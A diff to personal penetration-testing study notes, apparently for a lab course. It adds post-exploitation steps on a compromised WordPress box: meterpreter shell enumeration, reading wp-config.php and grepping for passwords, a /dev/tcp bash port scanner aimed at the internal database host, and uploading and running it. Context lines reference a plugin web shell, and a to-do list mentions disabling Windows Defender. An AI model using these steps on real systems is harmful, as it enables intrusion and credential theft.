@@ -3179,14 +3179,54 @@ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph p?cmd=
     #+END_SRC
     
 *** Post-Exploitation Enumeration
+    + enum meta infos
     #+BEGIN_SRC sh
 meterpreter > shell
 ifconfig # ip address
 hostname # ajla
 cat /etc/issue # Ubuntu 20.04.2 LTS \n \l
 cat /proc/version # Linux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021
+pwd # /var/www/html/wp-content/plugins/plugin-shell
+cd /var/www/html
+ls -lah
+cat wp-config.php # find config file, or:
+grep -rnw '/path/to/somewhere/' -e 'PASSWORD' ## grep match in the folder
+  ## -r recursive, -n line number, -w match the whole word, -e pattern
+  ## ref: [[https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux]]
+     #+END_SRC
 
-#+END_SRC
+     + enum opened port, check DB default ports first maybe? (/dev/tcp/host/port) (portscan.sh)
+     #+BEGIN_SRC bash
+#!/bin/bash
+# hosts=(127.0.0.1 127.0.0.2 127.0.0.3)
+hosts=(10.5.5.11)   ## DB_HOST
+# ports=(22 23 25 80)
+
+# timeout .1 bash -c "echo > /dev/tcp/$host/$port" && echo "port $port is open, host $hosts"
+
+for host in "${hosts[@]}"; do
+  # for port in "${ports[@]}";
+  for port in {1..65535}; do
+    timeout .1 bash -c "echo 2>/dev/null > /dev/tcp/$host/$port" &&
+      echo "port $port is open, host $hosts"
+  done
+done
+echo "Done"
+# (PWK p778)
+     #+END_SRC
+       - info: when used in redirection, bash handles "/dev/tcp/host/port" differently.
+       - ref: [[https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections][bash redirections]]
+     + upload the file
+     #+BEGIN_SRC bash
+# meterpreter > upload /home/kali/portscan.sh /tmp/portscan.sh
+# meterpreter > shell
+# or use webshell to write directly, or use wget to download from http server?
+
+cd /tmp
+chmod +x portscan.sh
+./portscan.sh
+     #+END_SRC
+     // CONTINUE
 
 
 * TODO list
@@ -3205,6 +3245,8 @@ cat /proc/version # Linux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc
   + AV bypassing
     - with Admin, util scripts to turn off Windows Defender && firewall
     - without Admin, obfuscation, string substitution.
+  + pivoting: ssh port-forward (local, remote, dynamic)
+  + useful linux file structure (/proc, /dev)
      
 ** boxes
    1. ensure 100% with msf.
